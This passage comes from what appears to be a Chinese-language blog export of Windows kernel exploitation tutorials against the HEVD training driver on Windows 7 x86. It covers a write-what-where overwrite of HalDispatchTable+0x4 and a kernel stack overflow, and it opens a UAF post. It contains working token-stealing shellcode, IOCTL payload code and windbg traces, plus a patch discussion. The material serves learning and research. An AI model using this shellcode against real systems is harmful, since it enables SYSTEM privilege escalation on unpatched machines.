class="number">0x22200b</span>, buf, <span class="number">8</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 windbg 中如果不能显示出 dbgprint 中内容的话输入下面的这条命令即可显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ed nt!Kd_DEFAULT_Mask 8</span><br></pre></td></tr></table></figure>
<p>我们运行刚才生成的程序，如我们所愿，这里已经成功调用了<code>ArbitraryOverwriteIoctlHandler</code>函数并且修改了 What 和 Where 指针</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; ed nt!Kd_DEFAULT_Mask 8</span><br><span class="line">kd&gt; g</span><br><span class="line">****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******</span><br><span class="line">[+] UserWriteWhatWhere: 0x0019FC90</span><br><span class="line">[+] WRITE_WHAT_WHERE Size: 0x8</span><br><span class="line">[+] UserWriteWhatWhere-&gt;What: 0x41414141</span><br><span class="line">[+] UserWriteWhatWhere-&gt;Where: 0x41414141</span><br><span class="line">[+] Triggering Arbitrary Overwrite</span><br><span class="line">[-] Exception Code: 0xC0000005</span><br><span class="line">****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******</span><br></pre></td></tr></table></figure>
<p>当然我们不能只修改成0x41414141，我们所希望的是把what指针覆盖为shellcode的地址，where指针修改为能指向shellcode地址的指针</p>
<h3 id="Where-amp-What-指针"><a href="#Where-amp-What-指针" class="headerlink" title="Where &amp; What 指针"></a>Where &amp; What 指针</h3><p>这里的where指针我们希望能够覆盖到一个安全可靠的地址，我们在windbg中反编译一下<code>NtQueryIntervalProfile+0x62</code>这个位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; u nt!NtQueryIntervalProfile+0x62</span><br><span class="line">nt!NtQueryIntervalProfile+0x62:</span><br><span class="line">84159ecd 7507            jne     nt!NtQueryIntervalProfile+0x6b (84159ed6)</span><br><span class="line">84159ecf a1ac7bf783      mov     eax,dword ptr [nt!KiProfileInterval (83f77bac)]</span><br><span class="line">84159ed4 eb05            jmp     nt!NtQueryIntervalProfile+0x70 (84159edb)</span><br><span class="line">84159ed6 e83ae5fbff      call    nt!KeQueryIntervalProfile (84118415)</span><br><span class="line">84159edb 84db            test    bl,bl</span><br><span class="line">84159edd 741b            je      nt!NtQueryIntervalProfile+0x8f (84159efa)</span><br><span class="line">84159edf c745fc01000000  mov     dword ptr [ebp-4],1</span><br><span class="line">84159ee6 8906            mov     dword ptr [esi],eax</span><br></pre></td></tr></table></figure>
<p>上面可以发现，<code>0x84159ed6</code>这里会调用到一个函数<code>KeQueryIntervalProfile</code>，我们继续跟进</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; u KeQueryIntervalProfile</span><br><span class="line">nt!KeQueryIntervalProfile:</span><br><span class="line">840cc415 8bff            mov     edi,edi</span><br><span class="line">840cc417 55              push    ebp</span><br><span class="line">840cc418 8bec            mov     ebp,esp</span><br><span class="line">840cc41a 83ec10          sub     esp,10h</span><br><span class="line">840cc41d 83f801          cmp     eax,1</span><br><span class="line">840cc420 7507            jne     nt!KeQueryIntervalProfile+0x14 (840cc429)</span><br><span class="line">840cc422 a1c86af683      mov     eax,dword ptr [nt!KiProfileAlignmentFixupInterval (83f66ac8)]</span><br><span class="line">840cc427 c9              leave</span><br><span class="line">2: kd&gt; u</span><br><span class="line">nt!KeQueryIntervalProfile+0x13:</span><br><span class="line">840cc428 c3              ret</span><br><span class="line">840cc429 8945f0          mov     dword ptr [ebp-10h],eax</span><br><span class="line">840cc42c 8d45fc          lea     eax,[ebp-4]</span><br><span class="line">840cc42f 50              push    eax</span><br><span class="line">840cc430 8d45f0          lea     eax,[ebp-10h]</span><br><span class="line">840cc433 50              push    eax</span><br><span class="line">840cc434 6a0c            push    0Ch</span><br><span class="line">840cc436 6a01            push    1</span><br><span class="line">2: kd&gt; </span><br><span class="line">nt!KeQueryIntervalProfile+0x23:</span><br><span class="line">840cc438 ff15fcc3f283    call    dword ptr [nt!HalDispatchTable+0x4 (83f2c3fc)]</span><br><span class="line">840cc43e 85c0            test    eax,eax</span><br><span class="line">840cc440 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (840cc44d)</span><br><span class="line">840cc442 807df400        cmp     byte ptr [ebp-0Ch],0</span><br><span class="line">840cc446 7405            je      nt!KeQueryIntervalProfile+0x38 (840cc44d)</span><br><span class="line">840cc448 8b45f8          mov     eax,dword ptr [ebp-8]</span><br><span class="line">840cc44b c9              leave</span><br><span class="line">840cc44c c3              ret</span><br></pre></td></tr></table></figure>
<p>上面的<code>0x840cc438</code>处会有一个指针数组，这里就是我们shellcode需要覆盖的地方，为什么是这个地方呢？这是前人发现的，这个函数在内核中调用的很少，可以安全可靠地覆盖，而不会导致计算机崩溃，对于初学者而言就把这个地方当公式用吧，下面简单看一下<code>HalDispatchTable</code>这个内核服务函数指针表，结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HAL_DISPATCH HalDispatchTable = &#123;</span><br><span class="line">    HAL_DISPATCH_VERSION,</span><br><span class="line">    xHalQuerySystemInformation,</span><br><span class="line">    xHalSetSystemInformation,</span><br><span class="line">    xHalQueryBusSlots,</span><br><span class="line">    xHalDeviceControl,</span><br><span class="line">    xHalExamineMBR,</span><br><span class="line">    xHalIoAssignDriveLetters,</span><br><span class="line">    xHalIoReadPartitionTable,</span><br><span class="line">    xHalIoSetPartitionInformation,</span><br><span class="line">    xHalIoWritePartitionTable,</span><br><span class="line">    xHalHandlerForBus,                  <span class="comment">// HalReferenceHandlerByBus</span></span><br><span class="line">    xHalReferenceHandler,               <span class="comment">// HalReferenceBusHandler</span></span><br><span class="line">    xHalReferenceHandler                <span class="comment">// HalDereferenceBusHandler</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<p>我们需要很清楚的知道，我们刚才在找什么，我们就是在找where指针的位置，所以我们只需要把where的位置放在<code>HalDispatchTable+0x4</code>处就行了，而what指针我们希望的是存放shellcode的位置</p>
<ul>
<li>what -&gt; &amp;shellcode</li>
<li>where -&gt; HalDispatchTable+0x4</li>
</ul>
<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><p>上面我们解释了where和what指针的原理，现在我们需要用代码来实现上面的过程，我们主要聚焦点在where指针上，我们需要找到<code>HalDispatchTable+0x4</code>的位置，我们大致分一下流程：</p>
<ol>
<li>找到 ntkrnlpa.exe 在 kernel mode 中的基地址</li>
<li>找到 ntkrnlpa.exe 在 user mode 中的基地址</li>
<li>找到 HalDispatchTable 在 user mode 中的地址</li>
<li>计算 HalDispatchTable+0x4 的地址</li>
</ol>
<p><strong>ntkrnlpa.exe 在 kernel mode 中的基地址</strong></p>
<p>我们用<code>EnumDeviceDrivers</code>函数检索系统中每个设备驱动程序的加载地址，然后用<code>GetDeviceDriverBaseNameA</code>函数检索指定设备驱动程序的基本名称，以此确定 ntkrnlpa.exe 在内核模式中的基地址，当然我们需要包含文件头<code>Psapi.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">NtkrnlpaBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID lpImageBase[<span class="number">1024</span>];</span><br><span class="line">	DWORD lpcbNeeded;</span><br><span class="line">	TCHAR lpfileName[<span class="number">1024</span>];</span><br><span class="line">	<span class="comment">//Retrieves the load address for each device driver in the system</span></span><br><span class="line">	EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase), &amp;lpcbNeeded);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Retrieves the base name of the specified device driver</span></span><br><span class="line">		GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, <span class="number">48</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(lpfileName, <span class="string">"ntkrnlpa.exe"</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[+]success to get %s\n"</span>, lpfileName);</span><br><span class="line">			<span class="keyword">return</span> lpImageBase[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ntkrnlpa.exe 在 user mode 中的基地址</strong></p>
<p>我们用函数<code>LoadLibrary</code>将指定的模块加载到调用进程的地址空间中，获取它在用户模式下的基地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HMODULE hUserSpaceBase = LoadLibrary(<span class="string">"ntkrnlpa.exe"</span>);</span><br></pre></td></tr></table></figure>
<p><strong>HalDispatchTable 在 user mode 中的地址</strong></p>
<p>我们用<code>GetProcAddress</code>函数返回<code>ntkrnlpa.exe</code>中的导出函数<code>HalDispatchTable</code>的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, <span class="string">"HalDispatchTable"</span>);</span><br></pre></td></tr></table></figure>
<p><strong>计算 HalDispatchTable+0x4 的地址</strong></p>
<p>如果你是一个pwn选手的话，你可以把这里的计算过程类比计算函数中的偏移，实际地址 = 基地址 + 偏移，最终我们确定下了<code>HalDispatchTable+0x4</code>的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + <span class="number">0x4</span>;</span><br></pre></td></tr></table></figure>
<p>我们计算出了where指针的位置，what指针放好shellcode的位置之后，我们再次调用<code>NtQueryIntervalProfile</code>内核函数就可以实现提权，但是这里的<code>NtQueryIntervalProfile</code>函数需要我们自己去定义(函数的详情建议下一个Windows NT4的源码查看)，函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">NtQueryIntervalProfile (</span><br><span class="line">    IN KPROFILE_SOURCE ProfileSource,</span><br><span class="line">    OUT PULONG Interval</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
<p>最后你可能还要注意一下堆栈的平衡问题，shellcode中需要平衡一下堆栈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static VOID ShellCode()</span><br><span class="line">&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		//int 3</span><br><span class="line">		pop edi	// the stack balancing</span><br><span class="line">		pop esi</span><br><span class="line">		pop ebx</span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread</span><br><span class="line">		mov eax, [eax + 0x50]   // Find the _EPROCESS structure</span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, 4				// edx = system PID(4)</span><br><span class="line"></span><br><span class="line">		// The loop is to get the _EPROCESS of the system</span><br><span class="line">		find_sys_pid :</span><br><span class="line">					 mov eax, [eax + 0xb8]	// Find the process activity list</span><br><span class="line">					 sub eax, 0xb8    		// List traversal</span><br><span class="line">					 cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID</span><br><span class="line">					 jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">					 // Replace the Token</span><br><span class="line">					 mov edx, [eax + 0xf8]</span><br><span class="line">					 mov[ecx + 0xf8], edx</span><br><span class="line">					 popad</span><br><span class="line">					 //int 3</span><br><span class="line">					 ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>详细的代码参考<a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/ArbitraryOverwrite/ArbitraryOverwrite/test.c" target="_blank" rel="noopener">这里</a>，最后提权成功</p>
<p><img src="/2019/07/28/Windows-Kernel-Exploit-内核漏洞学习-3-Write-What-Where/test.gif" alt="test"></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>上面的东西一定要自己调一遍，如何堆栈平衡的我没有写的很细，如果是初学者建议自己下断点调试，可能在整个过程中你会有许多问题，遇到问题千万不要马上就问，至少你要想半小时再去问，如果是个特别小的问题，可能别人还没来得及回你，你自己琢磨已经解决了，下一篇我会继续学习HEVD的其他漏洞，一起加油吧！</p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(2)-内核栈溢出</title>
    <url>/2019/07/28/%C2%96Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这是 Windows kernel exploit 系列的第二部分，前一篇我们讲了UAF的利用，这一篇我们通过内核空间的栈溢出来继续深入学习 Windows Kernel exploit ，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>栈溢出是系列漏洞中最为基础的漏洞，如果你是一个 pwn 选手，第一个学的就是简单的栈溢出，栈溢出的原理比较简单，我的理解就是用户对自己申请的缓冲区大小没有一个很好的把控，导致缓冲区作为参数传入其他函数的时候可能覆盖到了不该覆盖的位置，比如 ebp，返回地址等，如果我们精心构造好返回地址的话，程序就会按照我们指定的流程继续运行下去，原理很简单，但是实际用起来并不是那么容易的，在Windows的不断更新过程中，也增加了许多对于栈溢出的安全保护机制。</p>
<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>我们在IDA中打开源码文件<code>StackOverflow.c</code>源码文件<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank" rel="noopener">这里下载</a>查看一下主函数<code>TriggerStackOverflow</code>，这里直接将 Size 传入<code>memcpy</code>函数中，未对它进行限制，就可能出现栈溢出的情况，另外，我们可以发现 KernelBuffer 的 Size 是 0x800</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TriggerStackOverflow</span><span class="params">(<span class="keyword">void</span> *UserBuffer, <span class="keyword">unsigned</span> <span class="keyword">int</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> KernelBuffer[<span class="number">512</span>]; <span class="comment">// [esp+10h] [ebp-81Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+814h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  KernelBuffer[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;KernelBuffer[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0x7FC</span>u);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0x800</span>u, <span class="number">4u</span>);</span><br><span class="line">  DbgPrint(<span class="string">"[+] UserBuffer: 0x%p\n"</span>, UserBuffer);</span><br><span class="line">  DbgPrint(<span class="string">"[+] UserBuffer Size: 0x%X\n"</span>, Size);</span><br><span class="line">  DbgPrint(<span class="string">"[+] KernelBuffer: 0x%p\n"</span>, KernelBuffer);</span><br><span class="line">  DbgPrint(<span class="string">"[+] KernelBuffer Size: 0x%X\n"</span>, <span class="number">0x800</span>);</span><br><span class="line">  DbgPrint(<span class="string">"[+] Triggering Stack Overflow\n"</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们现在差的就是偏移了，偏移的计算是在windbg中调试得到的，我们需要下两处断点来找偏移，第一处是在<code>TriggerStackOverflow</code>函数开始的地方，第二处是在函数中的<code>memcpy</code>函数处下断点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; bl  //查看所有断点</span><br><span class="line">     0 e Disable Clear  8c6d16b9 e 1 0001 (0001) HEVD!TriggerStackOverflow+0x8f</span><br><span class="line">     1 e Disable Clear  8c6d162a e 1 0001 (0001) HEVD!TriggerStackOverflow</span><br><span class="line">kd&gt; g  //运行</span><br><span class="line">Breakpoint 1 hit  //断在了第一处</span><br><span class="line">HEVD!TriggerStackOverflow:</span><br><span class="line">8c6d162a 680c080000      push    80Ch</span><br><span class="line">kd&gt; r  //查看寄存器</span><br><span class="line">eax=c0000001 ebx=8c6d2da2 ecx=00000907 edx=0032f018 esi=886ad9b8 edi=886ad948</span><br><span class="line">eip=8c6d162a esp=91a03ad4 ebp=91a03ae0 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000206</span><br><span class="line">HEVD!TriggerStackOverflow:</span><br><span class="line">8c6d162a 680c080000      push    80Ch</span><br><span class="line">kd&gt; dd esp  //查看堆栈情况</span><br><span class="line">91a03ad4  8c6d1718 0032f018 00000907 91a03afc</span><br><span class="line">91a03ae4  8c6d2185 886ad948 886ad9b8 86736268</span><br><span class="line">91a03af4  88815378 00000000 91a03b14 83e84593</span><br><span class="line">91a03b04  88815378 886ad948 886ad948 88815378</span><br><span class="line">91a03b14  91a03b34 8407899f 86736268 886ad948</span><br><span class="line">91a03b24  886ad9b8 00000094 04a03bac 91a03b44</span><br><span class="line">91a03b34  91a03bd0 8407bb71 88815378 86736268</span><br><span class="line">91a03b44  00000000 91a03b01 44c7b400 00000002</span><br></pre></td></tr></table></figure>
<p>上面的第一处断点可以看到返回地址是0x91a03ad4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerStackOverflow+0x8f:</span><br><span class="line">8c6d16b9 e81ccbffff      call    HEVD!memcpy (8c6ce1da)</span><br><span class="line">kd&gt; dd esp</span><br><span class="line">91a03274  91a032b4 0032f018 00000907 8c6d25be</span><br><span class="line">91a03284  8c6d231a 00000800 8c6d2338 91a032b4</span><br><span class="line">91a03294  8c6d23a2 00000907 8c6d23be 0032f018</span><br><span class="line">91a032a4  1dcd205c 886ad948 886ad9b8 8c6d2da2</span><br><span class="line">91a032b4  00000000 00000000 00000000 00000000</span><br><span class="line">91a032c4  00000000 00000000 00000000 00000000</span><br><span class="line">91a032d4  00000000 00000000 00000000 00000000</span><br><span class="line">91a032e4  00000000 00000000 00000000 00000000</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=91a032b4 ebx=8c6d2da2 ecx=0032f018 edx=00000065 esi=00000800 edi=00000000</span><br><span class="line">eip=8c6d16b9 esp=91a03274 ebp=91a03ad0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246</span><br><span class="line">HEVD!TriggerStackOverflow+0x8f:</span><br><span class="line">8c6d16b9 e81ccbffff      call    HEVD!memcpy (8c6ce1da)</span><br></pre></td></tr></table></figure>
<p>上面的第二处断点可以看到0x91a032b4是我们<code>memcpy</code>的第一个参数，也就是<code>KernelBuffer</code>，我们需要覆盖到返回地址也就是偏移为 0x820</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0x91a03ad4</span><span class="number">-0x91a032b4</span>)</span><br><span class="line"><span class="string">'0x820'</span></span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>知道了偏移，我们只需要将返回地址覆盖为我们的shellcode的位置即可提权，提权的原理我在第一篇就有讲过，需要的可以参考我的第一篇，只是这里提权的代码需要考虑到栈的平衡问题，在<code>TriggerStackOverflow</code>函数开始的地方，我们下断点观察发现，ebp的值位置在91a3bae0，也就是值为<code>91a3bafc</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">HEVD!TriggerStackOverflow:</span><br><span class="line">0008:8c6d162a 680c080000      push    80Ch</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=c0000001 ebx=8c6d2da2 ecx=00000824 edx=001ef230 esi=885c5528 edi=885c54b8</span><br><span class="line">eip=8c6d162a esp=91a3bad4 ebp=91a3bae0 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000206</span><br><span class="line">HEVD!TriggerStackOverflow:</span><br><span class="line">0008:8c6d162a 680c080000      push    80Ch</span><br><span class="line">kd&gt; dd esp</span><br><span class="line">91a3bad4  8c6d1718 001ef230 00000824 (91a3bafc) =&gt; ebp</span><br><span class="line">91a3bae4  8c6d2185 885c54b8 885c5528 88573cc0</span><br><span class="line">91a3baf4  88815378 00000000 91a3bb14 83e84593</span><br><span class="line">91a3bb04  88815378 885c54b8 885c54b8 88815378</span><br><span class="line">91a3bb14  91a3bb34 8407899f 88573cc0 885c54b8</span><br><span class="line">91a3bb24  885c5528 00000094 04a3bbac 91a3bb44</span><br><span class="line">91a3bb34  91a3bbd0 8407bb71 88815378 88573cc0</span><br><span class="line">91a3bb44  00000000 83ede201 00023300 00000002</span><br></pre></td></tr></table></figure>
<p>当我们进入shellcode的时候，我们的ebp被覆盖为了0x41414141，为了使堆栈平衡，我们需要将ebp重新赋值为<code>97a8fafc</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; </span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">StackOverflow!ShellCode+0x3:</span><br><span class="line">0008:012c1003 cc              int     3</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=00000000 ebx=8c6d2da2 ecx=8c6d16f2 edx=00000000 esi=885b5360 edi=885b52f0</span><br><span class="line">eip=012c1003 esp=97a8fad4 ebp=41414141 iopl=0         nv up ei ng nz na po nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000282</span><br><span class="line">StackOverflow!ShellCode+0x3:</span><br><span class="line">0008:012c1003 cc              int     3</span><br><span class="line">kd&gt; dd esp</span><br><span class="line">97a8fad4  885b52f0 885b5360 8c6d2da2 97a8fafc</span><br><span class="line">97a8fae4  8c6d2185 885b52f0 885b5360 88573cc0</span><br><span class="line">97a8faf4  88815378 00000000 97a8fb14 83e84593</span><br><span class="line">97a8fb04  88815378 885b52f0 885b52f0 88815378</span><br><span class="line">97a8fb14  97a8fb34 8407899f 88573cc0 885b52f0</span><br><span class="line">97a8fb24  885b5360 00000094 04a8fbac 97a8fb44</span><br><span class="line">97a8fb34  97a8fbd0 8407bb71 88815378 88573cc0</span><br><span class="line">97a8fb44  00000000 83ede201 00023300 00000002</span><br></pre></td></tr></table></figure>
<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><p>利用思路中，我们介绍了为什么要堆栈平衡，下面是具体的shellcode部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ShellCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//__debugbreak(); // 运行到这里程序会自动断下来等待windbg的调试</span></span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">			pop    edi</span><br><span class="line">			pop    esi</span><br><span class="line">			pop    ebx</span><br><span class="line">			pushad</span><br><span class="line">			mov eax, fs:[<span class="number">124</span>h]</span><br><span class="line">			mov eax, [eax + <span class="number">050</span>h]</span><br><span class="line">			mov ecx, eax</span><br><span class="line">			mov edx, <span class="number">4</span></span><br><span class="line"></span><br><span class="line">		find_sys_pid :</span><br><span class="line">					 mov eax, [eax + <span class="number">0b</span>8h]</span><br><span class="line">					 sub eax, <span class="number">0b</span>8h</span><br><span class="line">					 cmp[eax + <span class="number">0b</span>4h], edx</span><br><span class="line">					 jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">					 mov edx, [eax + <span class="number">0f</span>8h]</span><br><span class="line">					 mov[ecx + <span class="number">0f</span>8h], edx</span><br><span class="line">					 popad</span><br><span class="line">					 pop ebp</span><br><span class="line">					 ret <span class="number">8</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造并调用shellcode部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x824</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">'A'</span>, <span class="number">0x824</span>);</span><br><span class="line">*(PDWORD)(buf + <span class="number">0x820</span>) = (DWORD)&amp;ShellCode;</span><br><span class="line">DeviceIoControl(hDevice, <span class="number">0x222003</span>, buf, <span class="number">0x824</span>,<span class="literal">NULL</span>,<span class="number">0</span>,&amp;bReturn,<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>具体的代码参考<a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/StackOverflow/StackOverflow/test.c" target="_blank" rel="noopener">这里</a>，最后提权成功</p>
<p><img src="/2019/07/28/Windows-Kernel-Exploit-内核漏洞学习-2-内核栈溢出/test.gif" alt></p>
<h1 id="0x03：补丁思考"><a href="#0x03：补丁思考" class="headerlink" title="0x03：补丁思考"></a>0x03：补丁思考</h1><p>我们先查看源文件 <code>StackOverflow.c</code> 中补丁的措施，区别很明显，不安全版本的<code>RtlCopyMemory</code>函数中的第三个参数没有进行控制，直接将用户提供的 Size 传到了函数中，安全的补丁就是对<code>RtlCopyMemory</code>的参数进行严格的设置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Stack Overflow\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br></pre></td></tr></table></figure>
<h1 id="0x04：后记"><a href="#0x04：后记" class="headerlink" title="0x04：后记"></a>0x04：后记</h1><p>通过这次的练习感受到Windows内核中和Linux中栈溢出的区别，在Linux中，如果我们想要栈溢出，会有canary，ASLR，NX等等保护需要我们去绕过，如果平台上升到win10，那么就会有更多全新的安全机制需要去考虑</p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(1)-UAF </title>
    <url>/2019/06/28/Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1-UAF/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>最近重新开始了我的Windows内核之旅，这是我总结的Windows kernel exploit系列的第一部分，前一篇我们讲了环境的配置，这一篇从简单的UAF入手，第一篇我尽量写的详细一些，实验环境是Windows 7 x86 sp1，研究内核漏洞是一件令人兴奋的事情，希望能通过文章遇到更多志同道合的朋友，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
